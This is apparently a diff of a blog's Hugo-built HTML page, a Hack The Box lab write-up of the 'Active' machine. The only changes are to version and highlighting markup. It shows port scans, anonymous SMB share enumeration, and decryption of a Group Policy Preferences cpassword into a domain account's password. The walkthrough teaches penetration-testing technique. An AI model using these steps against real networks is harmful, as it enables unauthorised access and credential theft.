@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="generator" content="Hugo 0.101.0" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hack The Box Write-up - Active | text/plain</title>
@@ -340,78 +340,78 @@ this account. Now the root flag is only one execution of psexec away.
 <h2 id="port-scan">Port scan</h2>
 <p>We start as usual with a quick <code>masscan</code> to get open ports as fast as possible.
 It returns lots of results:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">$ masscan -e tun0 -p 1-65535 --rate <span style="color:#ae81ff">2000</span> 10.10.10.100
- 
-Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-09-13 20:54:40 GMT
--- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
-Initiating SYN Stealth Scan
-Scanning 1 hosts [65535 ports/host]
-Discovered open port 53/tcp on 10.10.10.100
-Discovered open port 9389/tcp on 10.10.10.100
-Discovered open port 88/tcp on 10.10.10.100
-Discovered open port 445/tcp on 10.10.10.100
-Discovered open port 464/tcp on 10.10.10.100
-Discovered open port 49171/tcp on 10.10.10.100
-Discovered open port 3268/tcp on 10.10.10.100
-Discovered open port 49169/tcp on 10.10.10.100
-Discovered open port 49182/tcp on 10.10.10.100
-Discovered open port 5722/tcp on 10.10.10.100
-Discovered open port 49158/tcp on 10.10.10.100
-Discovered open port 49153/tcp on 10.10.10.100
-Discovered open port 593/tcp on 10.10.10.100
-Discovered open port 389/tcp on 10.10.10.100
-Discovered open port 49155/tcp on 10.10.10.100
-Discovered open port 47001/tcp on 10.10.10.100
-Discovered open port 636/tcp on 10.10.10.100
-Discovered open port 49152/tcp on 10.10.10.100
-Discovered open port 135/tcp on 10.10.10.100
-Discovered open port 3269/tcp on 10.10.10.100
-Discovered open port 139/tcp on 10.10.10.100
-Discovered open port 49154/tcp on 10.10.10.100
-Discovered open port 49157/tcp on 10.10.10.100
-</code></pre></div><p>Use <code>nmap</code> to get more details on the services running on these ports:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ nmap -sV -sC -p 53,9389,88,445,464,49171,3268,49169,49182,5722,49158,49153,593,389,49155,47001,636,49152,135,3269,139,49154,49157 10.10.10.100
-...
-PORT      STATE SERVICE       VERSION
-53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows
-Server 2008 R2 SP1)
-| dns-nsid:
-|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
-88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2018-09-13 21:01:03Z)
-135/tcp   open  msrpc         Microsoft Windows RPC
-139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  tcpwrapped
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
-3269/tcp  open  tcpwrapped
-5722/tcp  open  msrpc         Microsoft Windows RPC
-9389/tcp  open  mc-nmf        .NET Message Framing
-47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-49152/tcp open  msrpc         Microsoft Windows RPC
-49153/tcp open  msrpc         Microsoft Windows RPC
-49154/tcp open  msrpc         Microsoft Windows RPC
-49155/tcp open  msrpc         Microsoft Windows RPC
-49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49158/tcp open  msrpc         Microsoft Windows RPC
-49169/tcp open  msrpc         Microsoft Windows RPC
-49171/tcp open  msrpc         Microsoft Windows RPC
-49182/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>Host script results:
-|_clock-skew: mean: -3s, deviation: 0s, median: -3s
-| smb2-security-mode:
-|   2.02:
-|_    Message signing enabled and required
-| smb2-time:
-|   date: 2018-09-13 17:02:01
-|_  start_date: 2018-09-09 17:20:40
-</code></pre></div><p>This looks a lot like an Active Directory domain controller. We can see a
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>$ masscan -e tun0 -p 1-65535 --rate <span style="color:#ae81ff">2000</span> 10.10.10.100
+</span></span><span style="display:flex;"><span> 
+</span></span><span style="display:flex;"><span>Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2018-09-13 20:54:40 GMT
+</span></span><span style="display:flex;"><span>-- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan
+</span></span><span style="display:flex;"><span>Scanning 1 hosts [65535 ports/host]
+</span></span><span style="display:flex;"><span>Discovered open port 53/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 9389/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 88/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 464/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 49171/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 3268/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 49169/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 49182/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 5722/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 49158/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 49153/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 593/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 389/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 49155/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 47001/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 636/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 49152/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 3269/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 49154/tcp on 10.10.10.100
+</span></span><span style="display:flex;"><span>Discovered open port 49157/tcp on 10.10.10.100
+</span></span></code></pre></div><p>Use <code>nmap</code> to get more details on the services running on these ports:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ nmap -sV -sC -p 53,9389,88,445,464,49171,3268,49169,49182,5722,49158,49153,593,389,49155,47001,636,49152,135,3269,139,49154,49157 10.10.10.100
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows
+</span></span><span style="display:flex;"><span>Server 2008 R2 SP1)
+</span></span><span style="display:flex;"><span>| dns-nsid:
+</span></span><span style="display:flex;"><span>|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
+</span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2018-09-13 21:01:03Z)
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>464/tcp   open  kpasswd5?
+</span></span><span style="display:flex;"><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>636/tcp   open  tcpwrapped
+</span></span><span style="display:flex;"><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
+</span></span><span style="display:flex;"><span>3269/tcp  open  tcpwrapped
+</span></span><span style="display:flex;"><span>5722/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>9389/tcp  open  mc-nmf        .NET Message Framing
+</span></span><span style="display:flex;"><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>49152/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49153/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49155/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span style="display:flex;"><span>49158/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49169/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49171/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49182/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Host script results:
+</span></span><span style="display:flex;"><span>|_clock-skew: mean: -3s, deviation: 0s, median: -3s
+</span></span><span style="display:flex;"><span>| smb2-security-mode:
+</span></span><span style="display:flex;"><span>|   2.02:
+</span></span><span style="display:flex;"><span>|_    Message signing enabled and required
+</span></span><span style="display:flex;"><span>| smb2-time:
+</span></span><span style="display:flex;"><span>|   date: 2018-09-13 17:02:01
+</span></span><span style="display:flex;"><span>|_  start_date: 2018-09-09 17:20:40
+</span></span></code></pre></div><p>This looks a lot like an Active Directory domain controller. We can see a
 Windows host with LDAP, Kerberos and plenty of RPC ports. Moreover, there is a
 web server on 47001. Checking it out with a browser returns a 404 and nothing
 else. Lastly, we have ports 139 and 445 open, which means we should look for
@@ -420,8 +420,8 @@ SMB shares. Also note that nmap returned the name of the domain, which is
 <h2 id="web-server">Web server</h2>
 <p>Before doing anything else, I ran a scan on the web server to check if there
 are any hidden files or directories:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ wfuzz --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.100:47001/FUZZ
-</code></pre></div><p>To my disappointment, the scan did not deliver any results. Nevertheless, it
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ wfuzz --hc=404 -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.100:47001/FUZZ
+</span></span></code></pre></div><p>To my disappointment, the scan did not deliver any results. Nevertheless, it
 does not hurt to have it running and to proceed with manual enumeration after
 that.</p>
 <h2 id="smb-shares">SMB shares</h2>
@@ -429,78 +429,78 @@ that.</p>
 and the primary means by which Windows computers let other machines access
 files remotely. We can try to use <code>nmap</code> scripts to extract some information
 about possible vulnerabilities out of it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ nmap -p 445 --script vuln 10.10.10.100
-...
-PORT    STATE SERVICE
-445/tcp open  microsoft-ds
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>Host script results:
-|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR:
-Server disconnected the connection
-|_smb-vuln-ms10-054: false
-|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server
-disconnected the connection
-...
-</code></pre></div><p>This did not help too much. Maybe I was a bit too quick with this, so let&rsquo;s
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ nmap -p 445 --script vuln 10.10.10.100
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>PORT    STATE SERVICE
+</span></span><span style="display:flex;"><span>445/tcp open  microsoft-ds
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>Host script results:
+</span></span><span style="display:flex;"><span>|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: ERROR:
+</span></span><span style="display:flex;"><span>Server disconnected the connection
+</span></span><span style="display:flex;"><span>|_smb-vuln-ms10-054: false
+</span></span><span style="display:flex;"><span>|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: ERROR: Server
+</span></span><span style="display:flex;"><span>disconnected the connection
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>This did not help too much. Maybe I was a bit too quick with this, so let&rsquo;s
 step back and just connect with <code>smbclient</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ smbclient -L 10.10.10.100
-Enter WORKGROUP\root&#39;s password:
-Anonymous login successful
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span>        Sharename       Type      Comment
-        ---------       ----      -------
-        ADMIN$          Disk      Remote Admin
-        C$              Disk      Default share
-        IPC$            IPC       Remote IPC
-        NETLOGON        Disk      Logon server share
-        Replication     Disk
-        SYSVOL          Disk      Logon server share
-        Users           Disk
-Reconnecting with SMB1 for workgroup listing.
-Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
-Failed to connect with SMB1 -- no workgroup available
-</code></pre></div><p>Interesting! It looks like there are several shares available. Continuing with
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ smbclient -L 10.10.10.100
+</span></span><span style="display:flex;"><span>Enter WORKGROUP\root&#39;s password:
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span>        Sharename       Type      Comment
+</span></span><span style="display:flex;"><span>        ---------       ----      -------
+</span></span><span style="display:flex;"><span>        ADMIN$          Disk      Remote Admin
+</span></span><span style="display:flex;"><span>        C$              Disk      Default share
+</span></span><span style="display:flex;"><span>        IPC$            IPC       Remote IPC
+</span></span><span style="display:flex;"><span>        NETLOGON        Disk      Logon server share
+</span></span><span style="display:flex;"><span>        Replication     Disk
+</span></span><span style="display:flex;"><span>        SYSVOL          Disk      Logon server share
+</span></span><span style="display:flex;"><span>        Users           Disk
+</span></span><span style="display:flex;"><span>Reconnecting with SMB1 for workgroup listing.
+</span></span><span style="display:flex;"><span>Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+</span></span><span style="display:flex;"><span>Failed to connect with SMB1 -- no workgroup available
+</span></span></code></pre></div><p>Interesting! It looks like there are several shares available. Continuing with
 <code>smbclient</code>, we can try to anonymously connect to them to check which of them
 are protected and which not. Below are two examples. Connecting to &ldquo;NETLOGON&rdquo;
 does not work and fails with &ldquo;NT_STATUS_ACCESS_DENIED&rdquo;, whereas the share
 named &ldquo;Replication&rdquo; let&rsquo;s us in:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ smbclient \\\\10.10.10.100\\NETLOGON
-Enter WORKGROUP\root&#39;s password:
-Anonymous login successful
-tree connect failed: NT_STATUS_ACCESS_DENIED
-<span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010">
-</span><span style="color:#960050;background-color:#1e0010"></span> $ smbclient \\\\10.10.10.100\\Replication
-Enter WORKGROUP\root&#39;s password:
-Anonymous login successful
-Try &#34;help&#34; to get a list of possible commands.
-smb: \&gt; list
-0:      server=10.10.10.100, share=Replication
-...
-</code></pre></div><p>For easier enumeration, we could also use the amazing <code>smbmap</code> tool, which
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ smbclient \\\\10.10.10.100\\NETLOGON
+</span></span><span style="display:flex;"><span>Enter WORKGROUP\root&#39;s password:
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>tree connect failed: NT_STATUS_ACCESS_DENIED
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span> $ smbclient \\\\10.10.10.100\\Replication
+</span></span><span style="display:flex;"><span>Enter WORKGROUP\root&#39;s password:
+</span></span><span style="display:flex;"><span>Anonymous login successful
+</span></span><span style="display:flex;"><span>Try &#34;help&#34; to get a list of possible commands.
+</span></span><span style="display:flex;"><span>smb: \&gt; list
+</span></span><span style="display:flex;"><span>0:      server=10.10.10.100, share=Replication
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>For easier enumeration, we could also use the amazing <code>smbmap</code> tool, which
 conveniently lists all shares and the permissions we have:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ python smbmap.py -H 10.10.10.100 -d active.htb
-[+] Finding open SMB ports....
-[+] User SMB session establishd on 10.10.10.100...
-[+] IP: 10.10.10.100:445        Name: 10.10.10.100
-        Disk                                           Permissions
-        ----                                           -----------
-        ADMIN$                                         NO ACCESS
-        C$                                             NO ACCESS
-        IPC$                                           NO ACCESS
-        NETLOGON                                       NO ACCESS
-        Replication                                    READ ONLY
-        SYSVOL                                         NO ACCESS
-        Users                                          NO ACCESS
-</code></pre></div><p>Since &ldquo;Replication&rdquo; is the only share we can access, let&rsquo;s just grab all the
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ python smbmap.py -H 10.10.10.100 -d active.htb
+</span></span><span style="display:flex;"><span>[+] Finding open SMB ports....
+</span></span><span style="display:flex;"><span>[+] User SMB session establishd on 10.10.10.100...
+</span></span><span style="display:flex;"><span>[+] IP: 10.10.10.100:445        Name: 10.10.10.100
+</span></span><span style="display:flex;"><span>        Disk                                           Permissions
+</span></span><span style="display:flex;"><span>        ----                                           -----------
+</span></span><span style="display:flex;"><span>        ADMIN$                                         NO ACCESS
+</span></span><span style="display:flex;"><span>        C$                                             NO ACCESS
+</span></span><span style="display:flex;"><span>        IPC$                                           NO ACCESS
+</span></span><span style="display:flex;"><span>        NETLOGON                                       NO ACCESS
+</span></span><span style="display:flex;"><span>        Replication                                    READ ONLY
+</span></span><span style="display:flex;"><span>        SYSVOL                                         NO ACCESS
+</span></span><span style="display:flex;"><span>        Users                                          NO ACCESS
+</span></span></code></pre></div><p>Since &ldquo;Replication&rdquo; is the only share we can access, let&rsquo;s just grab all the
 content and check it out locally. After connecting with <code>smbclient</code>, we can
 download the entire share to a local folder &ldquo;/htb/active/smb/&rdquo; like so:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console">smb: \&gt; mask &#34;&#34;
-smb: \&gt; recurse ON
-smb: \&gt; prompt OFF
-smb: \&gt; lcd &#39;/htb/active/smb/&#39;
-smb: \&gt; mget *
-</code></pre></div><p>We get what seems to be a backup of the group policies in SYSVOL. In AD
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span>smb: \&gt; mask &#34;&#34;
+</span></span><span style="display:flex;"><span>smb: \&gt; recurse ON
+</span></span><span style="display:flex;"><span>smb: \&gt; prompt OFF
+</span></span><span style="display:flex;"><span>smb: \&gt; lcd &#39;/htb/active/smb/&#39;
+</span></span><span style="display:flex;"><span>smb: \&gt; mget *
+</span></span></code></pre></div><p>We get what seems to be a backup of the group policies in SYSVOL. In AD
 environments, administrators can define policies to change settings on the
 client machines. Microsoft calls this MS-GPPREF and the protocol is documented
 <a href="https://msdn.microsoft.com/en-us/library/cc232593.aspx">here</a>. It works such
@@ -522,50 +522,50 @@ It actually uses a publicly known static key you can get from <a href="https://m
 website</a>.</p>
 <p>Thus, we can <code>grep</code> all files we just found for a &ldquo;cpassword&rdquo; field and
 luckily, we find one (beautified below for readability):</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
-<span style="color:#f92672">&lt;Groups</span> <span style="color:#a6e22e">clsid=</span><span style="color:#e6db74">&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span><span style="color:#f92672">&gt;</span>
-  <span style="color:#f92672">&lt;User</span> <span style="color:#a6e22e">clsid=</span><span style="color:#e6db74">&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span>
-        <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span>
-        <span style="color:#a6e22e">image=</span><span style="color:#e6db74">&#34;2&#34;</span>
-        <span style="color:#a6e22e">changed=</span><span style="color:#e6db74">&#34;2018-07-18 20:46:06&#34;</span>
-        <span style="color:#a6e22e">uid=</span><span style="color:#e6db74">&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span><span style="color:#f92672">&gt;</span>
-    <span style="color:#f92672">&lt;Properties</span> <span style="color:#a6e22e">action=</span><span style="color:#e6db74">&#34;U&#34;</span>
-                <span style="color:#a6e22e">newName=</span><span style="color:#e6db74">&#34;&#34;</span>
-                <span style="color:#a6e22e">fullName=</span><span style="color:#e6db74">&#34;&#34;</span>
-                <span style="color:#a6e22e">description=</span><span style="color:#e6db74">&#34;&#34;</span>
-                <span style="color:#a6e22e">cpassword=</span><span style="color:#e6db74">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span>
-                <span style="color:#a6e22e">changeLogon=</span><span style="color:#e6db74">&#34;0&#34;</span>
-                <span style="color:#a6e22e">noChange=</span><span style="color:#e6db74">&#34;1&#34;</span>
-                <span style="color:#a6e22e">neverExpires=</span><span style="color:#e6db74">&#34;1&#34;</span>
-                <span style="color:#a6e22e">acctDisabled=</span><span style="color:#e6db74">&#34;0&#34;</span>
-                <span style="color:#a6e22e">userName=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span><span style="color:#f92672">/&gt;</span>
-  <span style="color:#f92672">&lt;/User&gt;</span>
-<span style="color:#f92672">&lt;/Groups&gt;</span>
-</code></pre></div><p>This file reads like it sets a password for a user called &ldquo;SVC_TGS&rdquo;. On Kali,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;Groups</span> <span style="color:#a6e22e">clsid=</span><span style="color:#e6db74">&#34;{3125E937-EB16-4b4c-9934-544FC6D24D26}&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;User</span> <span style="color:#a6e22e">clsid=</span><span style="color:#e6db74">&#34;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">image=</span><span style="color:#e6db74">&#34;2&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">changed=</span><span style="color:#e6db74">&#34;2018-07-18 20:46:06&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">uid=</span><span style="color:#e6db74">&#34;{EF57DA28-5F69-4530-A59E-AAB58578219D}&#34;</span><span style="color:#f92672">&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;Properties</span> <span style="color:#a6e22e">action=</span><span style="color:#e6db74">&#34;U&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">newName=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">fullName=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">description=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">cpassword=</span><span style="color:#e6db74">&#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">changeLogon=</span><span style="color:#e6db74">&#34;0&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">noChange=</span><span style="color:#e6db74">&#34;1&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">neverExpires=</span><span style="color:#e6db74">&#34;1&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">acctDisabled=</span><span style="color:#e6db74">&#34;0&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">userName=</span><span style="color:#e6db74">&#34;active.htb\SVC_TGS&#34;</span><span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/User&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/Groups&gt;</span>
+</span></span></code></pre></div><p>This file reads like it sets a password for a user called &ldquo;SVC_TGS&rdquo;. On Kali,
 we can decrypt the password with <code>gpp-decrypt</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-console" data-lang="console"> $ gpp-decrypt &#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;
-/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
-GPPstillStandingStrong2k18
-</code></pre></div><p>This works like a charm and we now have credentials for a user:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span> $ gpp-decrypt &#34;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&#34;
+</span></span><span style="display:flex;"><span>/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
+</span></span><span style="display:flex;"><span>GPPstillStandingStrong2k18
+</span></span></code></pre></div><p>This works like a charm and we now have credentials for a user:
 &ldquo;ACTIVE.HTB\SVC_TGS&rdquo; and &ldquo;GPPstillStandingStrong2k18&rdquo;.</p>
